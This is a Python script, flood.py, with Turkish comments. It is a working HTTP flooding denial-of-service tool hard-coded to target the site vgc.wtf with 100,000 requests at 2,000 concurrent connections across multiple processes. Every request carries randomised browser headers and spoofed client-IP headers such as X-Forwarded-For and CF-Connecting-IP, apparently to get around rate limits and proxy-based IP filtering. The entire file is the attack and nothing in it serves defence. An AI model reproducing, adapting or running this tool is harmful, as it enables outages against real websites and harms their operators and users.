# language: Python 3.10+, file: flood.py
# Linux: pip install aiohttp uvloop fake-useragent
# çalıştır: python flood.py

import asyncio
import aiohttp
import random
import time
import os
from fake_useragent import UserAgent
from multiprocessing import Process, cpu_count

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# ================== SABİT ==================
TARGET = "https://vgc.wtf"
TOTAL_REQUESTS = 100000
CONCURRENT = 2000
METHOD = "GET"
TIMEOUT = 6
PROCESSES = max(2, cpu_count() // 2)
# ===========================================

ua = UserAgent()

ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
]

LANGUAGES = [
    "en-US,en;q=0.9",
    "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
]

REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://yandex.com/",
    "https://www.facebook.com/",
    "https://t.co/",
    "https://www.youtube.com/",
    "https://www.reddit.com/",
    "https://vgc.wtf/",
    "",
]

def random_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def random_headers():
    ip = random_ip()
    return {
        "User-Agent": ua.random,
        "Accept": random.choice(ACCEPTS),
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        "Upgrade-Insecure-Requests": "1",
        "Referer": random.choice(REFERRERS),
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Client-IP": ip,
        "CF-Connecting-IP": ip,
        "True-Client-IP": ip,
        "X-Client-IP": ip,
        "X-Originating-IP": ip,
        "Forwarded": f"for={ip};proto=https",
        "Via": f"1.1 {random_ip()}",
        "DNT": random.choice(["1", "0"]),
        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors"]),
        "Sec-Fetch-Site": random.choice(["none", "cross-site"]),
    }

async def worker(session, sem, stats):
    async with sem:
        headers = random_headers()
        try:
            async with session.get(TARGET, headers=headers, timeout=TIMEOUT) as resp:
                await resp.read()
            stats["ok"] += 1
        except:
            stats["fail"] += 1

async def run_flood(worker_id, req_count):
    stats = {"ok": 0, "fail": 0}
    connector = aiohttp.TCPConnector(
        limit=CONCURRENT,
        limit_per_host=CONCURRENT,
        ttl_dns_cache=200,
        force_close=False,
        enable_cleanup_closed=True,
        ssl=False,
        keepalive_timeout=25,
    )
    timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=3)
    sem = asyncio.Semaphore(CONCURRENT)

    start = time.time()
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [worker(session, sem, stats) for _ in range(req_count)]
        batch = 2500
        for i in range(0, req_count, batch):
            await asyncio.gather(*tasks[i:i+batch])
            done = stats["ok"] + stats["fail"]
            elapsed = time.time() - start
            rps = done / elapsed if elapsed > 0 else 0
            print(f"[P{worker_id}] {done}/{req_count} | OK:{stats['ok']} FAIL:{stats['fail']} | {rps:.0f} rps")

    print(f"[P{worker_id}] BİTTİ → OK:{stats['ok']} FAIL:{stats['fail']}")

def process_entry(worker_id, req_count):
    asyncio.run(run_flood(worker_id, req_count))

def main():
    print(f"[*] Target       : {TARGET}")
    print(f"[*] Total req    : {TOTAL_REQUESTS}")
    print(f"[*] Concurrent   : {CONCURRENT}")
    print(f"[*] Processes    : {PROCESSES}")
    print("[*] Başlıyor...\n")

    per_process = TOTAL_REQUESTS // PROCESSES
    extra = TOTAL_REQUESTS % PROCESSES

    procs = []
    for i in range(PROCESSES):
        count = per_process + (1 if i < extra else 0)
        p = Process(target=process_entry, args=(i+1, count))
        p.start()
        procs.append(p)

    for p in procs:
        p.join()

    print("\n[+] Bitti.")

if __name__ == "__main__":
    main()
